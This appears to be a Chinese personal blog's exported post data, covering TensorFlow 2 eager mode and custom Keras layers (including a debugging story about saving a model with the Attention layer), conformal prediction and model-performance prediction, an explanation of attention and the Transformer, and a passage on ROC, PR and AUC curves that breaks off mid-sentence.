查询资料的过程中发现已经有人提出了这些问题：主要矛盾：keras的layer与tf的底层不能结合，如果要使用keras模块，就只能用keras的compile，不能用TF代码来训练，很不方便。 https://github.com/tensorflow/tensorflow/issues/26844#issuecomment-516755626 这条路就这么断了，目前来说TF的高层和底层API还是隔离开的，感觉keras强行弄进来没有什么太大的意义，希望TF以后可以做到高层底层API混合调用。 TF2 eager模式（用以代替和改写原来的session静态图模式） 首先，回顾一下TF1的代码： 12345678910cost = tf.reduce_mean((tf.square(predict - yh)) / 2) # 最小二乘法代价函数optimizer = tf.train.AdamOptimizer(0.01) # 使用ADAM优化，学习率0.01train_step = optimizer.minimize(cost) # 一个训练步骤with tf.Session() as sess: sess.run(init) # 初始化 for j in range(epoch): # 进行epoch次大循环 for i in range(30): # 对每个数据点的遍历 sess.run(train_step, &#123;xh: x[i], yh: y[i]&#125;) # 塞入一个数据点 TF2直接采用动态图的方法，与TF1相比，不再需要提前构造静态的神经网络，再采用Session与静态图进行交互。Session作为TF的标志性操作之一，在TF2中被删去，这个变化有很多人不适应，TF似乎面目全非了。但是在eager模式下，原TF的代码也可以完全改写过来： 123456789101112131415161718192021def bin_reg_model(xh): return tf.multiply(w, xh * xh) + b # 预测值def loss_object(predict, yh): return tf.reduce_mean((tf.square(predict - yh)) / 2) # 最小二乘法代价函数optimizer = tf.optimizers.Adam(1) # 使用ADAM优化，学习率0.01def train_step(x_train, y_train): with tf.GradientTape() as tape: # 在tape下才能进行反向传播求导 logits = bin_reg_model(x_train) # bin_reg_model输出模型的预测值 loss_value = loss_object(y_train, logits) # loss_object函数计算误差值 print('[+] Loss', loss_value.numpy()) grads = tape.gradient(loss_value, [w, b]) optimizer.apply_gradients(zip(grads, [w, b])) # optimizer可以自定义，也可以使用内置的类for j in range(epoch): # 进行epoch次大循环 for i in range(30): # 对每个数据点的遍历 train_step(x[i], y[i]) # 塞入一个数据点 需要注意的是，在TF1中也有apply_gradients更新的操作，只不过为了简便，TF1中一般使用optimizer.minimize(cost)代替gradient和optimizer.apply_gradients两步，即optimizer.minimize(cost)整合了这两步。TF2也有optimizer.minimize()函数，但是在TF2中，minimize函数似乎没有TF1好用。 另外，由于TF2使用了eager模式，可以一边构造神经网络一边debug，还可以通过a.shape得到当前向量的尺寸，可以更方便地编写代码。 TF2 tensorboard 与TF1相比，TF2的TFB变得更加简洁： 1234567891011log_dir = 'tf2_log'writer = tf.summary.create_file_writer(log_dir)...for j in range(epoch): # 进行epoch次大循环 for i in range(30): # 对每个数据点的遍历 loss = train_step(x[i], y[i]) # 塞入一个数据点 with writer.as_default(): # tensorboard记录 tf.summary.scalar('loss', loss, step=j*epoch+i) # 在任何位置都可以调用 keras自定义层 由于TF2主推keras，但是有的时候需要更加底层的操作修改，所以需要学习自定义层的编写。 注意事项 尽量保证自定义层类属性和方法的完整性，不然模型储存过程中会出现各种问题（get_config、__init__中的name等） 自定义层调用时需要设置name，模型重载时需要设置对应的name字典 需要重写（或可以重写）的函数 12345678## 必重写def __init__(self, position, d_model, name=\"PositionEmbedding\", **kwargs): # 申请、储存本层需要用到的属性、对象等def call(self, x): # 调用该层时进行的运算def get_config(self): # 返回初始化变量，用于模型读取时使用## 可重写def build(self, input_shape): # 需要根据input_shape改变配置时要重写的函数def compute_output_shape(self, input_shape): # 返回的矩阵大小 一些例子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687'''keras层为input添加一个可训练权重 =&gt; input · weight'''class Add_weight(layers.Layer): def __init__(self, name=\"Add_weight\", **kwargs): # 申请、储存本层需要用到的属性、对象等 super().__init__(name=name, **kwargs) def build(self, input_shape): # 需要根据input_shape改变配置时要重写的函数 # 添加的可训练的权重 self.weight_to_mut = tf.Variable(tf.constant(0.1, shape=[input_shape[2],input_shape[2]]),trainable=True) super().build(input_shape) # 一定要在最后调用它 def call(self, x): # 调用该层时进行的运算 return K.dot(x, self.weight_to_mut) # 点乘 def get_config(self): # 返回初始化变量，用于模型读取时使用 config=super().get_config().copy() return config def compute_output_shape(self, input_shape): # 返回的矩阵大小 return (input_shape[2], input_shape[2])input_wq = Add_weight(name='add_1')(inputs)'''attention is all you need 论文中的 position embedding层继承keras layerh2 = PositionEmbedding(time_step, embedding_size)(h1)'''class PositionEmbedding(layers.Layer): def __init__(self, position, d_model, name=\"PositionEmbedding\", **kwargs): super().__init__(name=name, **kwargs) # 储存用于恢复模型的init参数，用在get_config函数中 ##### self.position = position self.d_model = d_model ##### self.pos_encoding = self.positional_encoding(position, d_model) def get_angles(self, position, i, d_model): angles = 1 / tf.pow(10000, (2 * (i // 2)) / tf.cast(d_model, tf.float32)) return position * angles def positional_encoding(self, position, d_model): angle_rads = self.get_angles( position=tf.range(position, dtype=tf.float32)[:, tf.newaxis], i=tf.range(d_model, dtype=tf.float32)[tf.newaxis, :], d_model=d_model) # apply sin to even index in the array sines = tf.math.sin(angle_rads[:, 0::2]) # apply cos to odd index in the array cosines = tf.math.cos(angle_rads[:, 1::2]) pos_encoding = tf.concat([sines, cosines], axis=-1) pos_encoding = pos_encoding[tf.newaxis, ...] return tf.cast(pos_encoding, tf.float32) def call(self, inputs): return inputs + self.pos_encoding[:, :tf.shape(inputs)[1], :] def get_config(self): config = super().get_config().copy() config.update(&#123; 'position': self.position, 'd_model': self.d_model &#125;) return configh2 = PositionEmbedding(time_step, embedding_size, name=\"PositionEmbedding\")(h1) # 自定义层设置name 包含自定义层的模型重载 1234567model = tf.keras.models.load_model('model/attention.keras', custom_objects=&#123; 'PositionEmbedding': PositionEmbedding, 'add_1':Add_weight, 'add_2':Add_weight, 'add_3':Add_weight, &#125;) # 需要指定每个name对应的层的class TF2 keras的坑（keras本身的坑） 问题 在学习完attention有一段时间后，我想使用attention也写一个模型来检测webshell，同时也想实践一下keras自定义层。于是写了以下代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495'''attention is all you need 论文中的 position embedding层继承keras layerh2 = PositionEmbedding(time_step, embedding_size)(h1)'''class PositionEmbedding(layers.Layer): ...'''keras层为input添加一个可训练权重 =&gt; input · weight'''class Add_weight(layers.Layer): def __init__(self, name=\"Add_weight\", **kwargs): # 申请、储存本层需要用到的属性、对象等 super().__init__(name=name, **kwargs) def build(self, input_shape): # 需要根据input_shape改变配置时要重写的函数 # 添加的可训练的权重 self.weight_to_mut = tf.Variable(tf.constant(0.1, shape=[input_shape[2],input_shape[2]]),trainable=True) super().build(input_shape) # 一定要在最后调用它 def call(self, x): # 调用该层时进行的运算 return K.dot(x, self.weight_to_mut) # 点乘 def get_config(self): # 返回初始化变量，用于模型读取时使用 config=super().get_config().copy() return config def compute_output_shape(self, input_shape): # 返回的矩阵大小 return (input_shape[2], input_shape[2]) def build_model(): inputs = tf.keras.Input(shape=(n_steps, n_inputs,), batch_size=BATCH_SIZE) # weights input_wq = Add_weight(name='add_1')(inputs) input_wv = Add_weight(name='add_2')(inputs) input_wk = Add_weight(name='add_3')(inputs) h1 = layers.Attention()([ input_wq, input_wv, input_wk ]) # self-attention [query,value,key] # h1 = inputs h2 = PositionEmbedding(time_step, embedding_size, name=\"PositionEmbedding\")(h1) # 自定义层设置name h3 = layers.Flatten()(h2) # 展开后使用全连接 h4 = layers.Dense(n_classes, input_shape=(time_step, embedding_size))(h3) outputs = layers.Activation('softmax')(h4) model = tf.keras.Model(inputs=inputs, outputs=outputs) model.compile(optimizer=tf.keras.optimizers.Adam(), loss=tf.keras.losses.BinaryCrossentropy(), metrics=['accuracy']) return modelif __name__ == '__main__': if CONTINUE_TRAIN: model = tf.keras.models.load_model('model/attention.keras', custom_objects=&#123; 'PositionEmbedding': PositionEmbedding, 'add_1':Add_weight, 'add_2':Add_weight, 'add_3':Add_weight, &#125;) else: model = build_model() model.summary() ... model.fit(x_train, y_train, batch_size=BATCH_SIZE, epochs=training_iters//x_train.shape[0], validation_split=0.1) model.save('model/attention.keras') 在save的时候报错，说是get_config函数未重写。仔细检查了代码，反复确定，Add_weight层与PositionEmbedding层都重写了该函数，但是由于其他地方调用的都是官方的层，让我一直怀疑是自己的代码不规范造成的。 最后只能直接debug。刚开始的时候，由于我使用了VSCODE，debug设置默认不会跟进库函数，加上对于官方库的信任，我直接没有管官方keras库。发现我自己写的get_config函数被调用了，调动之后直接就报错了，让我误认为还是自己的问题。直到最后我想继续跟下去的时候，准备跟进官方库文件看看。 修改VSCODE debug设置为：&quot;justMyCode&quot;:false，再次跟进： 发现base_layer.py代码抛出异常的位置，由于官方库并没有写具体的层信息，导致层错误的对象不明确，于是略加修改库代码。 在base_layer.py的572行开始，修改抛出异常的库代码: 123if len(extra_args) &gt; 1 and hasattr(self.get_config, '_is_default'): raise NotImplementedError('Layers with arguments in `__init__` must ' 'override `get_config`.'+' name: '+config['name']) 再次运行模型训练得到输出： 1NotImplementedError: Layers with arguments in `__init__` must override `get_config`. name:attention 问题终于找到了，是官方的Attention层没有重写get_config函数，真坑。。。 解决 在网上也找到了这个问题的issue：https://github.com/tensorflow/tensorflow/issues/32662，原来别人早就发现了，可是不知道为啥我自己遇到的时候怎么搜都没有相关的，我找到问题了它也出来了:) 虽然github中说在新的版本中已解决该问题，但为了使代码更具通用性，我使用重载参数的方式储存，这样就不会因为get_config函数没有重写而报错。 后记 TF2与TF1相比，使用eager模式，去掉了静态图模式，在调试上更快捷。同时也引入了keras高层API，但是keras和底层API之间不能混用。并且由于官方过于强调keras，在其例子中主要都是keras搭建神经网络，底层的使用比较少，这使其不太友好。 由于keras底层可以使用TF，所以TF和keras相辅相成，熟悉TF后就可以轻松地修改keras代码，并且keras提供了很多自定义的接口，这使keras框架用起来非常方便。 最后推荐苏剑林大佬的博客中有关keras的部分:https://spaces.ac.cn/search/keras/","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/tags/机器学习/"}]},{"title":"使用模型预测模型的准确率：Conformal Prediction (共型预测)与MPP","slug":"使用模型预测模型的准确率：Conformal-Prediction-共型预测-与MPP","date":"2019-10-18T03:29:55.000Z","updated":"2025-02-06T15:11:51.476Z","comments":true,"path":"posts/机器学习/20191018-CPMPP.html","link":"","permalink":"https://hachp1.github.io/posts/机器学习/20191018-CPMPP.html","excerpt":"使用模型预测模型的准确率：Conformal Prediction (共型预测)与MPP 要解决的问题 机器学习模型的表现好坏多由训练数据与待预测的真实数据决定，模型的泛化力不同，根据收到的数据不同，预测效果也好坏不一。因此，如何选择适合的模型、如何预测模型是否会失效、模型的准确度如何，都是需要解决的问题。 同时，真实数据多根据外界环境的变化而有敏锐的改变，因此机器学习模型也需要不断更新。而这一过程如果由人力来操作则是复杂甚至不现实的，因此最好是由自动化的算法实现。工业生产中的数据往往没有标注，因此传统的将预测结果和标注对比的方式并不能预测生产过程中机器学习模型的准确度。 为了尝试解决以上这些问题，预测模型的准确率的方法被提出。","text":"使用模型预测模型的准确率：Conformal Prediction (共型预测)与MPP 要解决的问题 机器学习模型的表现好坏多由训练数据与待预测的真实数据决定，模型的泛化力不同，根据收到的数据不同，预测效果也好坏不一。因此，如何选择适合的模型、如何预测模型是否会失效、模型的准确度如何，都是需要解决的问题。 同时，真实数据多根据外界环境的变化而有敏锐的改变，因此机器学习模型也需要不断更新。而这一过程如果由人力来操作则是复杂甚至不现实的，因此最好是由自动化的算法实现。工业生产中的数据往往没有标注，因此传统的将预测结果和标注对比的方式并不能预测生产过程中机器学习模型的准确度。 为了尝试解决以上这些问题，预测模型的准确率的方法被提出。 基本思想 在原模型的基础上，使用另一个模型预测原模型在数据集上的准确率。 实现过程 共型预测 Conformal Prediction（CP）的过程 CP是一种使用模型预测准确率的方法，大致过程如下： 使用训练集训练出一个模型，此处简称原模型 使用训练集的数据以及原模型对训练集作出的预测相结合作为训练集，训练出一个新的模型（此处称为CP模型） CP模型的输入特征可以与原模型的输入不同（两个模型的特征相关但不一定要完全一致） CP模型的输出是1个置信度和1个不一致程度。CP模型直接使用新模型去拟合原模型输出是否与真实y值不一致的程度（如直接拟合差值的绝对值等，原论文中未出现明确的方法） 然后会通过公式将该值映射到0~1之间的值： \\[ p^y=\\frac{|\\{i=1,...,n|α_i^y\\geα_n^y\\}|}{n}，其中，||代表数量值 \\] 可以看到，该映射将α按样本的数量等距映射到0~1之间，并且α的值越大，映射出的p值越小；因为α是不一致性，那么p值就用来衡量一致性的大小。 经过以上步骤，我们得到了一个可以判断原模型是否准确的CP模型。 CP模型输出了原模型是否可信的p值。 Model Performance Prediction（MPP）的过程 MPP是另一种使用模型预测准确率的方法，大致过程如下： 使用训练集训练出一个模型，此处简称原模型 使用训练集的数据以及原模型对训练集作出的预测相结合作为训练集，训练出一个新的模型（此处称为MPP模型） MPP模型的输入特征可以与原模型的输入不同（两个模型的特征相关但不一定要完全一致） MPP模型的输出是0（预测错误）或1（预测正确），在这里有两种情况：分类与拟合，在分类时，原模型预测正确则向MPP模型输入y=1，反之输入y=0；在拟合时，人为规定一个阈值ε，如果原模型预测的结果与真实值相差小于阈值则判断为预测正确，向MPP模型输入y=1，反之输入y=0 在拟合问题中，阈值ε的取值使用了空模型理论（the null model concept）与REC(Regression Error Characteristic)肘部法则来确定。 经过以上步骤，我们得到了一个可以判断原模型是否准确的MPP模型。 可以看出MPP模型是一个二分类模型，其输出了原模型是否会预测正确的判断。 思考 整体来看，使用新模型判断原模型是否正确或者预测原模型的准确率的做法与提升模型（boosting）有类似的地方。提升模型是使用新的模型预测原模型结果与真实结果的差值，并且可以迭代多次，典型的模型有GBDT、XGBoost、LGBM等。提升模型更像是直接使用新模型来整合到整个模型中为最后的结果做出贡献。而结果预测模型则是输出一个供人作参考的值，用来对原模型作出评判。 参考 MPP：Model Performance Prediction OpML 2019提前看：模型表现预测与分布式机器学习 Regression Error Characteristic Curves","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/tags/机器学习/"}]},{"title":"attention与Transformer结构浅析","slug":"attention与Transformer结构浅析","date":"2019-10-13T08:58:01.000Z","updated":"2025-02-06T15:11:50.398Z","comments":true,"path":"posts/机器学习/20191013-attention.html","link":"","permalink":"https://hachp1.github.io/posts/机器学习/20191013-attention.html","excerpt":"attention与Transformer结构浅析 前言 attention机制除了“attention”之外，另一个关键词是“相似度”，阅读attention结构时记住“相似度”这个词。 为了对attention模型提出的原因作出解释，我们首先分析RNN的一些特点。","text":"attention与Transformer结构浅析 前言 attention机制除了“attention”之外，另一个关键词是“相似度”，阅读attention结构时记住“相似度”这个词。 为了对attention模型提出的原因作出解释，我们首先分析RNN的一些特点。 RNN 朴素RNN的思想很简单，即把上一步的输出与这一步的输入同时输入新CELL： \\[ \\boldsymbol{y}_t = f(\\boldsymbol{y}_{t-1},\\boldsymbol{x}_t) \\] 在这个基础上，出现了RNN的各种变种：LSTM、GRU等 RNN的缺陷 RNN结构和其变种有明显的缺陷。在时序过长时，最初的神经元传递的信息会逐渐消失，所以RNN适合对短时序的数据进行学习。 attention与Transformer attention结构本身不是时序模型而是词袋模型，没有直接使用先后顺序来理解数据，而是从着重点入手，对不同区域的数据给予不同的注意力。由于本身没有在时序上的迭代，在长时序时，attention也可以捕捉到最初神经元的信息。 矩阵乘法的意义 在说明attention的计算过程之前，我们首先要理解矩阵乘法的意义。这里以线性组合和矩阵内积两个方面相结合来理解attention机制中的矩阵乘法。 线性组合 矩阵乘法的过程，就是把左边的矩阵的列向量按右边矩阵的列向量进行线性组合。同理，如果看作行向量，则是右边的行向量按左边的行向量的线性组合。 在attention的计算过程中，连续用到两个矩阵乘法，则直接理解为行向量的线性组合。而线性组合的操作即是“应该”放置“多大”的注意力（按照线性组合的系数放置注意力） 矩阵内积 由向量的内积可以推广到矩阵内积，而向量内积有定义：\\(|α||β|cosθ\\)，可以用来衡量两向量的相似性。同理，矩阵内积的大小可以衡量两个矩阵之间行向量与列向量之间的相似性（左行右列）。此处的左行右列也证明了第二个矩阵需要进行转置操作才能衡量行与行之间的相似性。 在attention操作的过程中，两矩阵相乘（第二个矩阵经过转置）得到的矩阵即任意两行之间相似度关系的大小。 attention计算过程 最原始的attention操作计算的即两个矩阵每行之间的相似程度。attention本身的过程中没有涉及到权重的运算。而实际操作时，attention可以在Q、K、V中涵盖可变的权重，使计算过程更灵活（如：\\(&quot;Q&quot;=\\boldsymbol{Q}\\boldsymbol{W}_i^Q\\)）。下面首先介绍基本的attention结构。 attention attention的权重的表达式为： \\[ α_i=softmax(s(key_i,q)) \\] 其中，\\(α_i\\)称为注意力分布，\\(s(key_i,q)\\)为注意力打分机制，常见的有： \\[ 加性模型：s(x_i,q)=v^Ttanh(Wx_i+Uq) \\] \\[ 点积模型：s(x_i,q)=x_i^Tq \\] \\[ 缩放点积模型：s(x_i,q)=\\frac{x_i^Tq}{\\sqrt{d_k}} \\] \\[ 双线性模型：s(x_i,q)=x^T_iWq \\] 论文中采用的计算式为： \\[ Attention(\\boldsymbol{Q},\\boldsymbol{K},\\boldsymbol{V}) = softmax\\left(\\frac{\\boldsymbol{Q}\\boldsymbol{K}^{\\top}}{\\sqrt{d_k}}\\right)\\boldsymbol{V} \\] 将Q、K、V每一行向量拆开看，可以很容易看出三个向量之间连续使用了两个点积计算，前面说过，点积计算的是两个向量之间的相似程度： \\[ Attention(\\boldsymbol{q}_t,\\boldsymbol{K},\\boldsymbol{V}) = \\sum_{s=1}^m \\frac{1}{Z}\\exp\\left(\\frac{\\langle\\boldsymbol{q}_t, \\boldsymbol{k}_s\\rangle}{\\sqrt{d_k}}\\right)\\boldsymbol{v}_s \\] 在原论文中说明，在高维度点乘的过程中，输出的数据会很大，再经过softmax映射后，就呈现出接近0和1的趋势（而没有类似于0.5的过度），失去了softmax的概率映射的意义，所以除以\\(\\sqrt{d_k}\\)。 忽略掉\\(\\sqrt{d_k}\\)，可以很容易体会到attention的过程，Q、K、V分别代表query, keys, values。首先，函数通过一个矩阵乘法操作\\(\\boldsymbol{K}\\)矩阵得到\\(\\boldsymbol{Q}\\boldsymbol{K}^{\\top}\\)，之后通过softmax获得一个根据相似度，该词应该放置多大的“attention”，输出的矩阵描述了query和key之间任意两个元素的关联强度（attention只负责计算空间相似度，实际的关联关系由之前使用的word embedding算法本身获得的向量的性质决定，比如使用word2vec可以将意义相近的词映射到向量空间相近的地方，则attention从词意上计算其相似度）。 之后将关联强度与V作矩阵乘法，就得到了神经网络“集中注意”后的输出值。由上文对矩阵乘法的理解，此处可以给出注意力权重与V相乘的过程在实际情况的理解：左边的矩阵的第i行第j列代表了一个句子中第i个词与第j个词的之间的关系大小；右边的矩阵则是整个句子的向量化矩阵，其中第i行表示第i个词。由矩阵与线性组合的理解，就可以看作一个词向量对应的输出结果是以该词与其他词的相似性作为系数的对应词向量的线性组合。可以看出，一个词与另一个词的含义如果越相似，那经过attention后另一个词对这个词的向量的影响就越大。 整个过程连起来解释就是：根据Q和K的相似度大小来决定V前的系数，从而输出V的一个线性组合。拿一个实际例子来看：我们现在有一个句子“我们是学生，我们热爱学习”，经过向量化后，在计算attention时（此处使用self-attention），我们发现“学生”和“学习”的相似度很高，于是重点关注了这句话的“学生”和“学习”两个词，达到了attention的目的。 self-attention 在attention的基础下很容易得出self-attention的运算过程。顾名思义，self-attention就是对自身的attention： \\[ Attention(\\boldsymbol{X}\\boldsymbol{W}_i^Q,\\boldsymbol{X}\\boldsymbol{W}_i^K,\\boldsymbol{X}\\boldsymbol{W}_i^V) \\] 仅有自身的矩阵乘法不够灵活，所以在attention的基础下，对attention的每个输入前都加上了weight。 个人对self-attention的理解是：举例来说，比如在一个文本分类任务中，有一句话为：“读书能够使人学习到很多有价值的东西”。那么这句话的重点应该放在“读书”、“学习到”上。在我们尝试确定关注度时，我们是对这个句子本身进行分析后得出的结果，所以self-attention也是用这种方法来得出关注度的。按照苏剑林大师傅的话就是“在序列内部做Attention，寻找序列内部的联系”。 多头attention 类似于CNN的多核卷积捕捉不同信息，多头attention将多个attention拼接起来： \\[ head_i = Attention(\\boldsymbol{Q}\\boldsymbol{W}_i^Q,\\boldsymbol{K}\\boldsymbol{W}_i^K,\\boldsymbol{V}\\boldsymbol{W}_i^V) \\] \\[ MultiHead(\\boldsymbol{Q},\\boldsymbol{K},\\boldsymbol{V}) = Concat(head_1,...,head_h)\\boldsymbol{W^{\\boldsymbol{O}}} \\] Multi-Head Attention 可以注意到，此处的“Q、K、V”都是加入权重后的Q、K、V。在网上有的文章中，将self-attention或多头attention中的Q、K、V与基础attention搞混了，直接带入X，得到类似\\(Attention(\\boldsymbol{X},\\boldsymbol{X},\\boldsymbol{X})\\)的形式，这和原论文是有出入的。直接使用\\(Attention(\\boldsymbol{X},\\boldsymbol{X},\\boldsymbol{X})\\)得到的结果只是类似于三个X直接连乘的计算结果，从数学表达式上看只取决于输入的向量，没有经过神经网络学习的权值，而多头attention中的形式是\\(Attention(\\boldsymbol{X}\\boldsymbol{W}_i^Q,\\boldsymbol{X}\\boldsymbol{W}_i^K,\\boldsymbol{X}\\boldsymbol{W}_i^V)\\)，里面还包含了神经网络“根据实际情况灵活变化权值”的含义。 Positional Encoding 前面提到，attention模型本身是词袋模型，因为如果将K,V按行打乱顺序（相当于句子中的词序打乱），那么Attention的结果还是一样的（容易证明，矩阵任意两行交换顺序后自身与自身的转置相乘，得到的矩阵只是按行交换了顺序而已）；说明self-attention结构本身是一个词袋模型。所以还需要一个加入位置信息的操作，不然就会遗失重要的顺序信息。所以在paper中，Transformer使用了Positional Encoding加入顺序信息。 具体操作如下（这里给出的是某个位置的向量的某个维度的映射过程）： \\[ \\left\\{\\begin{aligned}&amp;PE_{2i}(pos,2i)=\\sin\\Big(pos/10000^{2i/{d_{model}}}\\Big)\\\\ &amp;PE_{2i+1}(pos,2i+1)=\\cos\\Big(pos/10000^{2i/{d_{model}}}\\Big) \\end{aligned}\\right. \\] 其中，pos为位置的序列，i是当前的维度；这样，就可以把整个向量组按位置重新映射成一个大小与整个矩阵相同的位置向量组。使用这个映射的原因是，因为有关系\\(\\sin(\\alpha+\\beta)=\\sin\\alpha\\cos\\beta+\\cos\\alpha\\sin\\beta\\)和\\(\\cos(\\alpha+\\beta)=\\cos\\alpha\\cos\\beta-\\sin\\alpha\\sin\\beta\\)，所以如果两个向量存在位置相差，他们之间成线性关系，则可以更好地通过机器学习学习出这个关系（如在sin中，只用学习出sinα和cosα），这样就给学习位置信息打下基础。 以下是一个长度为20个词的句子经过PE得到的位置矩阵，每个词的维度为512，每个PE值范围在[-1,1]；左侧是用sine函数生成，右侧是用cosine生成（本来应该交叉生成，由于Q、K、V矩阵的行可交换性，将左边右边分别批量计算）： positional_encoding 图片来自：https://jalammar.github.io/illustrated-transformer/ 但是，PE这种硬编码并不能完美的表示位置信息，这也是Transformer模型的一个缺点。 Position-wise Feed-Forward Networks 在Transformer结构中还用到了FFN全连接网络（一个两层的全连接网络），计算过程如下（一个ReLu激活的全连接嵌套了一个线性激活的全连接）： \\[ FFN(x) = max(0,xW1+b1)W2+b2 \\] attention效率分析 通过矩阵乘法，我们可以看出，attention在计算过程中与数据维度相关的复杂度为\\(O(d^2)\\)。而这个矩阵乘法本身则完成了一个句子中任意两个词之间关系的计算。可以预见，当数据的维度过高（句子很长）时，计算量会偏大。 Transformer 就Attention is All You Need这篇论文而言，它的核心在于提出了attention这个结构。而论文中同时也提出了Transformer模型，作为attention的第一个应用。 首先放图（一句话只有两个词的Transformer）： 图片来自：https://jalammar.github.io/illustrated-transformer/ 在前文对多头attention、位置嵌入（PE）、FFN结构了解的基础和对seq2seq的了解上，可以比较容易的理解Transformer的结构。 Transformer是典型的encoder-decoder结构。 首先是encoder： 先定义一个结构：AN层：首先加上原数据，然后经过Layer Normalization处理；这里的AN层是一个残差操作，其思想跟深度残差网络类似（个人理解是原始数据是最重要的信息来源，在经过深层的神经网络处理后，虽然得到了特征提取，但原始信息有部分丢失，此时直接将原始特征相加后能够直接把原始信息引入深层次网络中）。 经过词向量嵌入之后，直接与PE相加，加入位置信息。 通过多头self-attention（此处多头加入权重对原始向量作出映射）后经过残差AN层，输入FFN（注意此处，每一个词都由单独的一个DNN处理，但实际上可以由一个拼接的DNN来处理，所以图中的两个Feed Forward可以由一个拼接的大DNN代替，参考），再经过AN层，这个结构重复N次。 transformer_encoding 图片来自：https://jalammar.github.io/illustrated-transformer/ 然后是decoder： decoder将已经翻译过的输出当作最初的词向量传入（比如已经翻译的“I am a”的词向量)，这里的实现过程是，词向量“未来”的位置会被mask操作遮挡（将它们设置为-inf），从而保证每一步输入的词向量长度一致，但又有变长的信息作为输入，类似于一般的词向量对齐操作。 通过多头self-attention（此处多头加入权重对原始向量作出映射），经过残差AN层；再通过多头attention（此处多头加入权重对原始向量作出映射），不过，第二次attention从前层获取输出转成query矩阵，接收最后层编码器的key和value矩阵做key和value矩阵，再经过AN层；输入FFN层（与encoder同样的，每一个词都由单独的一个DNN处理，但实际上也可以直接由一个拼接的长DNN处理），再进入AN层。这个结构重复N次。 最终通过线性全连接层和softmax输出当前翻译词语是字典中每个单词的概率。 transformer_decoding 图片来自：https://jalammar.github.io/illustrated-transformer/ 在训练时，最基本的LOSS函数是最终的softmax与准确的词语的onehot之间的交叉熵。网上也有其他更复杂的结构，比如先输出最高概率的位置，再经过一层神经网络输出最终结果。 一些个人想法 attention结构的关键词是“相似度”和“关注度”，即根据相似度大小确定关注度。 由于attention可以计算不同词之间的关系，在其输出中已经包含了“上下文”的含义，可以在一定程度上解决“一词多义”的问题（可以比较容易的证明：同一个词语在不同的句子中，经过attention操作后得到的向量是不一样的）。 比较重要的问题是“词袋模型”问题和“一词多义”问题。 bojone版本attention与原论文的“不一致” 在bojone实现的attention中，PE编码直接将前半段使用cos处理，后半段使用sin处理；原文则使用sin和cos交叉的方式。 具体的issue有https://github.com/bojone/attention/issues/2、https://github.com/bojone/attention/issues/5、https://github.com/bojone/attention/issues/11。作者给出的解释是attention的行是可以任意打乱顺序的，因为它本身就是词袋模型。 在这里，我个人更偏向于按原文方式进行PE，我给出的理由是：加入PE的句子不再是词袋模型，而PE本身的计算顺序就和位置密切相关。在bojone的观点下，PE的顺序是不重要的，即把PE按行打乱顺序对结果是没有任何影响的。这可能并不正确，由图像“positional_encoding”可以看出，PE的计算过程中，每个行打乱顺序后效果并不一致，并且这些交替的顺序中本身可能就蕴含了时序关系。（都是个人感觉）所以在使用bojone版本的attention时我倾向于忠实原文的方法。 参考资料 Attention is All You Need 《Attention is All You Need》浅读（简介+代码） nlp中的Attention注意力机制+Transformer详解 The Illustrated Transformer","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习-算法","slug":"机器学习-算法","permalink":"https://hachp1.github.io/tags/机器学习-算法/"}]},{"title":"ROC、PR和REC曲线、AUC、AOC与肘部方法浅析","slug":"ROC、PR和REC曲线、AUC、AOC与肘部方法浅析","date":"2019-10-05T07:59:33.000Z","updated":"2025-02-06T15:11:50.976Z","comments":true,"path":"posts/机器学习/20191005-ROC_REC_PR.html","link":"","permalink":"https://hachp1.github.io/posts/机器学习/20191005-ROC_REC_PR.html","excerpt":"ROC、PR和REC曲线、AUC、AOC与肘部方法浅析","text":"ROC、PR和REC曲线、AUC、AOC与肘部方法浅析 ROC与AUC ROC与AUC的基本概念 在仅输出概率值的模型中，不能使用准确率、召回率等数值来衡量模型的好坏（除非人为设定了阈值）；这个时候需要一种衡量模型本身好坏而不是衡量阈值好坏，并且能够找到科学的阈值的方法。ROC（receiver operating characteristic）曲线正是这种方法。 ROC曲线是用来衡量输出概率值的二分类模型的好坏的一种方法。 AUC是ROC曲线与x轴围成的面积大小。 ROC曲线画法 条件：模型的输出是概率值而不是0和1 人为设置不同阈值，以FPR（FP/N=FP/(FP+TN)，即误分为1的样例占所有0样例的比例）为横坐标，TPR或召回率（TP/P=TP/(TP+FN)，即正确分类为1的样例占所有1样例的比例）为纵坐标可以绘制出曲线 ROC曲线特点： 1. ROC曲线可以用来判定一个输出概率的模型（需要设定阈值）的好坏 2. ROC曲线越接近左上角，则模型越好 3. ROC曲线的面积（AUC）越接近1，则模型越好 4. ROC曲线的折线段数与样本的数量一致，所以样本越多，ROC曲线越光滑 5. 如上图所示，TPR用到的TP和FN同属P列，FPR用到的FP和TN同属N列，所以即使P或N的整体数量发生了改变，也不会影响到另一列。也就是说，即使正例与负例的比例发生了很大变化（样本不平衡），ROC曲线也不会产生大的变化。 6. 综上，ROC适合衡量一个模型本身，与PR相反。 肘部方法 在实际模型的构建时，我们需要确定一个判断结果是否为1的阈值以输出二分类的结果。而阈值的选择是人为的，对模型的预测结果影响很大，所以需要一个科学的方法来确定阈值。 根据ROC图像的肘部可以确定阈值 分析： 假设样本平衡，即\\(P=N\\)，有如下证明： \\[ FPR=\\frac{FP}{N}=\\frac{FP}{FP+TN} \\] \\[ TPR=\\frac{TP}{P}=\\frac{TP}{TP+FN} \\] \\[ \\because{P=N} \\] \\[ \\therefore{ \\frac{FPR}{TPR}=\\frac{FP}{TP} } \\] 要使模型更好，则FP越小越好，TP越大越好；则纵坐标比横坐标的比值越大越好；在比值一定的情况下，若将FP和TP看作同等重要，则纵坐标越大越好（比值不变时，我们希望TP越大越好），所以选择肘部处的阈值最合适。 PR曲线 PR曲线画法 人为设置不同阈值，以召回率recall（TP/P=TP/(TP+FN)），为横坐标，准确率Precision（TP/(TP+FP)）为纵坐标，绘制出PR曲线。 PR曲线展示的是Precision vs Recall的曲线，PR曲线与ROC曲线的相同点是都采用了TPR 